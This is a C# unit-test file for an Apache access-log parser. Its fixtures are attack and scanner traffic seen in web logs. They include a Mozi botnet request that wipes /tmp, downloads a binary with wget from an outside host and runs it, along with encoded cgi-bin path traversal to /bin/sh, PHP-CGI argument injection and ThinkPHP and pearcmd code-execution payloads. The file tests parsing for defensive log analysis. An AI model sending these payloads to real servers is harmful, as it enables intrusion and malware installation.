using System.Net;

using Schiza.LogEngine.Parsing;
using Schiza.Shared.Requests;

namespace Schiza.LogEngine.Tests;

public class ApacheLogParserTests
{
    private const string SyntheticPrefix =
        """203.0.113.7 - - [04/Nov/2026:15:18:21 +0100] "GET / HTTP/1.1" 200 458 "-" "curl/8.0" 294 "example.org" example.org:443 TLSv1.3""";

    private static readonly IApacheLogParser Parser = new ApacheLogParser();

    public static TheoryData<string> AllLabels => [.. AccessLogFixture.Labels];

    [Theory]
    [MemberData(nameof(AllLabels))]
    public void Parse_AcceptsEveryRealLine(string label)
    {
        Assert.IsType<LogParseResult.Parsed>(Parser.Parse(AccessLogFixture.Line(label)));
    }

    [Fact]
    public void Parse_ReadsAllFieldsOfCurrentFormat()
    {
        ApacheRequest request = ParseRequest("new-format-tls13");

        ApacheRequest expected = new(
            IPAddress.Parse("198.51.100.1"),
            new DateTimeOffset(2026, 11, 4, 15, 18, 21, TimeSpan.FromHours(1)),
            new RequestLine(RequestLineKind.Parsed, "GET /favicon.ico HTTP/1.1", "GET", "/favicon.ico", null, "HTTP/1.1"),
            "https://server.example.org/",
            "Mozilla/5.0 (X11; Linux x86_64; rv:159.0) Gecko/20100101 Firefox/159.0",
            "server.example.org",
            "TLSv1.3",
            "aus-rckZHr8ACc8rSxFu6AAAAE",
            new ResponseInfo(404, 458, 236, TimeSpan.FromMicroseconds(294)));
        Assert.Equal(expected, request);
    }

    [Fact]
    public void Parse_LeavesOptionalFieldsEmptyForOlderFormat()
    {
        ApacheRequest request = ParseRequest("get-plain-zgrab");

        Assert.Equal(new ResponseInfo(200, 1336, null, TimeSpan.FromMicroseconds(1023)), request.Response);
        Assert.Null(request.UniqueId);
    }

    [Theory]
    [InlineData("get-tls13-browser-ua", "GET", "/wp-login.php", null, "HTTP/1.1")]
    [InlineData("post-tls13", "POST", "/xmlrpc.php", null, "HTTP/1.1")]
    [InlineData("head", "HEAD", "/favicon.ico", null, "HTTP/1.1")]
    [InlineData("options", "OPTIONS", "/", null, "HTTP/1.1")]
    [InlineData("nonstandard-method-501", "UEQQ", "/", null, "HTTP/1.1")]
    [InlineData("query-rest-route", "GET", "/", "rest_route=/wp/v2/users/", "HTTP/1.1")]
    [InlineData("l9scan-debug-panel", "GET", "/debug/default/view", "panel=config", "HTTP/1.1")]
    [InlineData("percent-encoded-path", "GET", "/%E2%9D%A4.php", null, "HTTP/1.1")]
    [InlineData("path-traversal-encoded", "POST", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh", null, "HTTP/1.1")]
    [InlineData("double-percent-encoded", "POST", "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh", null, "HTTP/1.1")]
    [InlineData("php-cgi-argument-injection", "POST", "/", "%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input", "HTTP/1.1")]
    [InlineData("php-cgi-double-encoded", "POST", "/index.php", "%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input", "HTTP/1.1")]
    [InlineData("http10-host-dash-mozi", "GET", "/setup.cgi", "next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://198.51.100.10:34959/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1", "HTTP/1.0")]
    public void Parse_SplitsRequestLineWithoutDecodingIt(string label, string method, string path, string? query, string protocol)
    {
        RequestLine requestLine = ParseRequest(label).RequestLine;

        Assert.Equal(RequestLineKind.Parsed, requestLine.Kind);
        Assert.Equal(method, requestLine.Method);
        Assert.Equal(path, requestLine.Path);
        Assert.Equal(query, requestLine.Query);
        Assert.Equal(protocol, requestLine.Protocol);
    }

    [Theory]
    [InlineData("escaped-backslash", """s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello""")]
    [InlineData("escaped-quote", """lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php""")]
    public void Parse_KeepsEscapesAndDoesNotShiftLaterFields(string label, string query)
    {
        ApacheRequest request = ParseRequest(label);

        Assert.Equal(RequestLineKind.Parsed, request.RequestLine.Kind);
        Assert.Equal("/index.php", request.RequestLine.Path);
        Assert.Equal(query, request.RequestLine.Query);
        Assert.Equal(404, request.Response!.Status);
        Assert.Equal("libredtail-http", request.UserAgent);
        Assert.Equal("192.0.2.1:80", request.Host);
    }

    [Theory]
    [InlineData("tls-hello-short", """\x16\x03\x01""", 432)]
    [InlineData("tls-hello-4-bytes", """\x16\x03\x01\x02""", 432)]
    [InlineData("tls-hello-long", """\x16\x03\x01\x01\x0c\x01""", 432)]
    [InlineData("tls-hello-printable-byte", """\x16\x03\x03\x02b\x01""", 432)]
    [InlineData("single-control-byte", """\x03""", 432)]
    [InlineData("newline-only", """\n""", 432)]
    [InlineData("weblogic-t3-over-tls", """t3 12.1.2\n""", 4409)]
    [InlineData("leakix-plain", "LEAKIX", 432)]
    [InlineData("leakix-tls", "LEAKIX", 5477)]
    [InlineData("ssh-banner", "SSH-2.0-probe", 432)]
    public void Parse_KeepsSignalFromGarbageRequestLine(string label, string raw, long bytesSent)
    {
        ApacheRequest request = ParseRequest(label);

        Assert.Equal(new RequestLine(RequestLineKind.Malformed, raw), request.RequestLine);
        Assert.Equal(400, request.Response!.Status);
        Assert.Equal(bytesSent, request.Response.BytesSent);
        Assert.Equal(IPAddress.Parse(AccessLogFixture.Line(label).Split(' ')[0]), request.ClientIp);
    }

    [Theory]
    [InlineData("timeout-plain-zero-bytes", 0, null)]
    [InlineData("timeout-tls", 5024, "TLSv1.3")]
    [InlineData("timeout-tls-other-size", 5040, "TLSv1.3")]
    public void Parse_RecognizesMissingRequestLine(string label, long bytesSent, string? tlsProtocol)
    {
        ApacheRequest request = ParseRequest(label);

        Assert.Equal(new RequestLine(RequestLineKind.Missing, "-"), request.RequestLine);
        Assert.Equal(408, request.Response!.Status);
        Assert.Equal(bytesSent, request.Response.BytesSent);
        Assert.Equal(tlsProtocol, request.TlsProtocol);
    }

    [Theory]
    [InlineData("get-tls13-referer-ip", "https://192.0.2.1/", "192.0.2.1", "TLSv1.3")]
    [InlineData("get-referer-self-env", "http://server.example.org/.env", "server.example.org", "TLSv1.3")]
    [InlineData("get-tls12", null, "192.0.2.1", "TLSv1.2")]
    [InlineData("host-ip-port", null, "192.0.2.1:80", null)]
    [InlineData("percent-encoded-path", null, "192.0.2.1.ipv4.isp.example.net", null)]
    [InlineData("http10-host-dash-mozi", null, null, null)]
    public void Parse_MapsDashToNull(string label, string? referer, string? host, string? tlsProtocol)
    {
        ApacheRequest request = ParseRequest(label);

        Assert.Equal(referer, request.Referer);
        Assert.Equal(host, request.Host);
        Assert.Equal(tlsProtocol, request.TlsProtocol);
    }

    [Theory]
    [InlineData("ua-dash", null)]
    [InlineData("ua-aiohttp", "Python/3.11 aiohttp/3.9.1")]
    [InlineData("ua-go-client", "Go-http-client/1.1")]
    [InlineData("options", "Mozilla/5.0 (l9scan/2.0.13e223e203e2239313; +https://leakix.net)")]
    public void Parse_ReadsUserAgent(string label, string? userAgent)
    {
        Assert.Equal(userAgent, ParseRequest(label).UserAgent);
    }

    [Theory]
    [InlineData("redirect-301", 301)]
    [InlineData("ua-aiohttp", 200)]
    [InlineData("git-config", 404)]
    [InlineData("nonstandard-method-501", 501)]
    public void Parse_ReadsStatus(string label, int status)
    {
        Assert.Equal(status, ParseRequest(label).Response!.Status);
    }

    [Fact]
    public void Parse_NeverThrowsOnTruncatedRealLines()
    {
        foreach (string label in AccessLogFixture.Labels)
        {
            string line = AccessLogFixture.Line(label);
            for (int length = 0; length < line.Length; length++)
            {
                Assert.NotNull(Parser.Parse(line[..length]));
            }
        }
    }

    [Fact]
    public void Parse_TreatsDashUniqueIdAsMissing()
    {
        LogParseResult.Parsed result = Assert.IsType<LogParseResult.Parsed>(Parser.Parse(SyntheticPrefix + " 236 -"));

        Assert.Null(result.Request.UniqueId);
        Assert.Equal(236, result.Request.Response!.BodyBytes);
    }

    [Theory]
    [InlineData("", LogParseError.Empty)]
    [InlineData("garbage", LogParseError.UnexpectedStructure)]
    [InlineData(SyntheticPrefix + " ", LogParseError.UnexpectedStructure)]
    [InlineData(SyntheticPrefix + " 236", LogParseError.UnexpectedStructure)]
    [InlineData(SyntheticPrefix + " 236 id extra", LogParseError.UnexpectedStructure)]
    [InlineData("""203.0.113.7 - - [04/Nov/2026:15:18:21 +0100] "GET / HTTP/1.1""", LogParseError.UnexpectedStructure)]
    [InlineData("""203.0.113.7 - - [04/Nov/2026:15:18:21 +0100] "GET / \""", LogParseError.UnexpectedStructure)]
    [InlineData("""203.0.113.7 - - [04/Nov/2026:15:18:21""", LogParseError.UnexpectedStructure)]
    [InlineData("""not-an-ip - - [04/Nov/2026:15:18:21 +0100] "-" 408 0 "-" "-" 1 "-" a:80 -""", LogParseError.InvalidClientIp)]
    [InlineData("""203.0.113.7 - - [99/Nov/2026:15:18:21 +0100] "-" 408 0 "-" "-" 1 "-" a:80 -""", LogParseError.InvalidTimestamp)]
    [InlineData("""203.0.113.7 - - [04/Nov/2026:15:18:21 +9900] "-" 408 0 "-" "-" 1 "-" a:80 -""", LogParseError.InvalidTimestamp)]
    [InlineData("""203.0.113.7 - - [04/Nov/2026:15:18:21 +0100] "-" abc 0 "-" "-" 1 "-" a:80 -""", LogParseError.InvalidNumber)]
    [InlineData("""203.0.113.7 - - [04/Nov/2026:15:18:21 +0100] "-" 99999999999 0 "-" "-" 1 "-" a:80 -""", LogParseError.InvalidNumber)]
    [InlineData("""203.0.113.7 - - [04/Nov/2026:15:18:21 +0100] "-" 408 -1 "-" "-" 1 "-" a:80 -""", LogParseError.InvalidNumber)]
    [InlineData("""203.0.113.7 - - [04/Nov/2026:15:18:21 +0100] "-" 408 0 "-" "-" 9223372036854775807 "-" a:80 -""", LogParseError.InvalidNumber)]
    [InlineData(SyntheticPrefix + " abc id", LogParseError.InvalidNumber)]
    public void Parse_ReportsLineThatBreaksTheFormat(string line, LogParseError error)
    {
        Assert.Equal(new LogParseResult.Unparseable(line, error), Parser.Parse(line));
    }

    [Theory]
    [InlineData("\\x16 / HTTP/1.1")]
    [InlineData("GET  HTTP/1.1")]
    [InlineData("GET /a b HTTP/1.1")]
    [InlineData("GET / FTP/1.1")]
    [InlineData("GET / HTTP/x")]
    [InlineData(" / HTTP/1.1")]
    [InlineData("")]
    public void Parse_TreatsUnusualRequestLineAsMalformed(string raw)
    {
        string line = $"""203.0.113.7 - - [04/Nov/2026:15:18:21 +0100] "{raw}" 400 0 "-" "-" 1 "-" a:80 -""";

        LogParseResult.Parsed result = Assert.IsType<LogParseResult.Parsed>(Parser.Parse(line));

        Assert.Equal(new RequestLine(RequestLineKind.Malformed, raw), result.Request.RequestLine);
    }

    private static ApacheRequest ParseRequest(string label) =>
        Assert.IsType<LogParseResult.Parsed>(Parser.Parse(AccessLogFixture.Line(label))).Request;
}
